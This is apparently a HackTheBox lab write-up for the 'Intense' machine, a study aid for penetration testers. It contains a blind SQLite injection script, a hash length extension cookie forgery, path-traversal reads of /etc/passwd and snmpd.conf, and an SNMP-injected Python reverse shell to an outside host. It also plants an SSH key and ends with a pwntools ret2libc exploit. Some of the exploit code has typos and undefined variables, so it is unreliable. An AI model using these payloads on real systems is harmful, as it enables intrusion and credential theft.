---
image: https://www.hackthebox.com/storage/avatars/41fa976e012eb51bee13efc5419ce8ac.png
categories: [writeup, hackthebox, pentest]
---

As always, nmap

```bash
ports=$(sudo nmap -p- --min-rate=1000 -T4 10.10.10.195 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
sudo nmap -sC -sV -oN nmap/scan -p $ports 10.10.10.195
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

Going to the website, we see:

![image-20201102220344828](/assets/img/image-20201102220344828.png)

Which says that we can login with credentials `guest:guest`, and gives us a link to download the source code of the web application (http://10.10.10.195/src.zip).

Analyzing the source code, we can see that when we login, the webapp creates a salted hash for our password 

![image-20201102220704359](/assets/img/image-20201102220704359.png)

Then puts that in a field called "secret", which, combined with the username, and re-encoded like this

![image-20201102220834580](/assets/img/image-20201102220834580.png)

Gives us the session. Then, this session is re-encoded and signed like this

![image-20201102221102881](/assets/img/image-20201102221102881.png) 

Gives us the cookie. And now, thanks to some SQL (`sqlite3` is used, reading source code) magic injections taken from [this reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md), we can see that the field "message" in `/submitmessage` is vulnerable to injections. Now, looking at the `is_admin` function, we can see 

![image-20201102221933039](/assets/img/image-20201102221933039.png)

The admin user has a field "role" that equals 1. It is a field in the database, so we can exploit this information to make some SQL injection magic to retrieve the admin's secret! The query will be this one:

```sql
' AND (select CASE WHEN ( (SELECT hex(substr(secret,0,1)) FROM users WHERE role=1) = hex('f') ) then match(1,1) END ))--
```

And the answer will be:

![image-20201102222601904](/assets/img/image-20201102222601904.png)

Every time we send a message with a different letter the answer is always "OK", except with "f", it seems that "f" is the first letter of admin's secret... But we have to automate this or we risk to become stupid. I wrote a very little python script to achieve that:

```python
#!/usr/bin/env python3

import sys
import requests
import string

URL      = "http://10.10.10.195"
ENDPOINT = URL + "/submitmessage"
COOKIE   = {"auth": "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.sM+sPFosMol5cXEvchIHoXtiHyMgg1UmsPiSX8lzgLc=" }

## We need to retrieve admin's secret
# >> echo $COOKIE | cut -d "." -f 1 | base64 -d
# username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
# >> echo $SECRET | wc -c
# 65
## Which is 65 alnum char lenght

def test(payload):
    response = requests.post(ENDPOINT, data = { "message" : payload }, cookies = COOKIE )
    return response.text

adminsecret = ""
for cnt in range(1,66):
    stop = False
    for letter in string.ascii_lowercase + string.digits:
        if stop:
            break
        payload = f"' AND (select CASE WHEN ( (SELECT hex(substr(secret,{cnt},1)) FROM users WHERE role=1) = hex('{letter}') ) then match(1,1) END ))--"
        resp = test(payload)
        if 'unable' in resp:
            adminsecret += letter
            if len(payload) == 64:
                print(f"[+] Finished, admin secret is:\n{adminsecret}")
                sys.exit(0)
            stop = True
    print(f"[+] Found new letter, updated secret: {adminsecret}")
```

The result was good:

![image-20201102223055862](/assets/img/image-20201102223055862.png)

The admin's secret is:

```
f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
```

Apparently, there is a thing called hash length attack, which take advantage of the hash padding that prepends a secret value to the data before hashing... It is really cool, look at [this article](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) and [this tool](https://github.com/bwall/HashPump). You can use the tool this way in python:

```python
#!/usr/bin/env python3

from base64 import b64decode, b64encode
import os, hashpumpy, binascii, requests

ADMIN_SESSION = ';username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;'
URL           = "http://10.10.10.195"
ENDPOINT      = URL + "/admin"

def get_cookie():
    session = requests.Session()
    session.post(URL + "/postlogin", data = {"username": "guest", "password": "guest"})
    return session.cookies["auth"]

( b64_data, b64_signature ) = get_cookie().split(".")
guest_data = b64decode(b64_data)
guest_sign = b64decode(b64_signature)

# We know the key length is between 8 and 15
for i in range(7, 16):
    (digest, message) = hashpumpy.hashpump(guest_sign.hex(), guest_data, ADMIN_SESSION, i) 
    admincookie = b64encode(message).decode("utf-8") + "." + b64encode(binascii.unhexlify(digest)).decode('utf-8')
    req = requests.get(ENDPOINT, cookies = { "auth" : admincookie } )     
    if req.status_code != 403:
        print(f"[+] FOUND: {admincookie}")
        exit(0)

print(f"[+] Not found :(")
```

Editing the cookie in our browser will give us access as admin! Yay! Now we can use those sweet Flask routes that we were unable to use before, such as:

![image-20201103001310789](/assets/img/image-20201103001310789.png)

Let's curl a little:

```bash
curl -X POST --cookie "$ADMIN_COOKIE" --data "logfile=../../../../../etc/passwd" "http://10.10.10.195/admin/log/view"
...
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
user:x:1000:1000:user:/home/user:/bin/bash
web:x:1001:1001:::/bin/false
Debian-snmp:x:111:113::/var/lib/snmp:/bin/false
...
```

A good old LFI reveals a user named `Debian-snmp`, after some research on "SNMP", and after getting to know that it is a network layer protocol with some configuration files and custom commands, and knowing that we can inject and trigger some commands knowing a certain security string. That security string is saved in the config files... So, let's access them with:

```bash
curl -X POST --cookie "$ADMIN_COOKIE" --data "logfile=../../../../../etc/snmp/snmpd.conf" "http:
//10.10.10.195/admin/log/view"
```

Getting our beautiful `rwcommunity` string: "SuP3RPrivCom90".

![image-20201103003206768](/assets/img/image-20201103003206768.png)

Then, start listening with `nc` and we can prepare our payload and add it to `snmp` following [this article](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e):

```bash
# Check if nc is installed
curl -s -X POST --cookie "$ADMIN_COOKIE" --data "logdir=../../../../../bin" "http://10.10.10.195/admin/log/dir" | grep -o "'nc'"
# Create command call
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."lolz"'  = createAndGo 'nsExtendCommand."lolz"' = /usr/bin/pyhton3 'nsExtendArgs."lolz"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.89\",9003));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"'
# Reset SNMP to trigger the injected payload
snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects
```

![image-20201103011037124](/assets/img/image-20201103011037124.png)

Download the files from `/home/user` and start to analyze them, you'll notice that the executable operates on port 5001 on localhost, so why don't we establish an ssh tunnel to be more comfortable?

```bash
# Generate ssh key
ssh-keygen -b 2048 -t ed25519 -f ./key -q -N "" -C ""
# Put the key on the server
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."lolz"'  = createAndGo 'nsExtendCommand."lolz"' = /bin/bash 'nsExtendArgs."lolz"' = "-c 'echo ${KEY} >> ~/.ssh/authorized_keys'" && snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects
# Launch local port forwarding
ssh Debian-snmp@10.10.10.195 -i key -N -L 5001:127.0.0.1:5001 -v
```

Using `gdb` on the binary file, and running `info proc mappings`:

![image-20201105174415052](/assets/img/image-20201105174415052.png)

We see that `libc-2.32.so` is loaded, and since there are countermeasures for buffer overflows, and since the stack canary is enabled, it is time for a [return to libc attack](https://www.youtube.com/watch?v=m17mV24TgwY). To do so, we need to make the program to return, after the executed function, to the `system` system call indexed in the `libc` library, which is `libc-2.27.so` on the box. We can retrieve that version with:

```bash
# On victim
locate libc | grep "\.so$"
cp <libc> /tmp && cd /tmp
python3 -m http.server
# On attacker
wget "http://10.10.10.195:8000/<libc>"
```

Then, we have to execute the `ret2libc` attack knowing the offset of the system call on the exact version of libc. To do so, we need (with an active `ssh` tunnel):

```python
from pwd import *

# Define basic variables and files location (to get some offsets)
HOST = "127.0.0.1"
PORT = 5001
LIBC = "./libc-2.27.so"
EXEC = "./note_server"

# https://pwntools.readthedocs.io/en/stable/context.html
context(os="linux", arch="amd64")
# https://pwntools.readthedocs.io/en/stable/tubes.html
con = remote(HOST,PORT)

def deliv(data):
	con.send(p8(1))
	con.send(p8(len(data)))
	con.send(data)

def write_to(val=0):
	if val == None:
		val = len(app_len)
	while val < 1024:
		app_len = min(255, 1024 - val)
		app_data = cyclic(app_len)
		deliv(app_data)
		val += app_len


def copy_to(offset, size):
	con.send(p8(2))
	con.send(p16(offset))
	con.send(p8(size))


def read_notes(size=0):
	if size == None:
		con.send(p8(3))
		data = con.recvall()
	else:
		con.send(p8(3))
		data = con.recv(size)
	return data


def rop(can, rbp, ropp):
	padding = p64(0x4141) + p64(can) + p64(rbp) + ropp.chain()
	deliv(padding)
	write_to(val=len(padding))
	copy_to(offset=0, size=len(padding))
	f = read_notes(1024 + len(padding))
	return f


# Fill the buffer and read the stack
write_to()
# Use binary function to read notes from offset
copy_to(1024, 32)
# Read notes from the end of the buffer
data = read_notes(1056)[1024:]

# Address of the canary
canary = u64(data[8:16])
# Pointer for current stack frame 
rbp = u64(data[16:24])
# Pointer for next instruction
rip = u64(data[24:])

libc_call_address = rip - 0xf54 #address libc exit(0)

# https://pwntools.readthedocs.io/en/stable/elf/elf.html
efi = ELF(EXEC, checksec=False)
efi.address = libc_call_address 

# Return Oriented Programming
# https://pwntools.readthedocs.io/en/stable/rop/rop.html
ropp = ROP(efi) 
ropp.write(4, efi.got['write'])

# Enstablish a new connection
con = remote(host, port)
rop(can, rbp, ropping)
libc_address = u64(con.recv(8))


efi2 = ELF(LIBC, checksec=False)
efi2.address = libcc - efi2.symbols['write']

# Return Oriented Programming
# https://pwntools.readthedocs.io/en/stable/rop/rop.html
rop2 = ROP(efi2)
rop2.dup2(4, 0)
rop2.dup2(4, 1)

# Check the offset of the system call
rop2.execve(next(efi2.search(b"/bin/sh\x00")), 0, 0)

# Enstablish the last connection
con = remote(host, port)
rop(can, rbp, ropp=rop2)
# Make it interactive because we returned to /bin/sh as root!
con.interactive()
```

To get more info about the library, refer to [the documentation](https://pwntools.readthedocs.io/en/stable/globals.html). And profit, but damn, it was Intense...
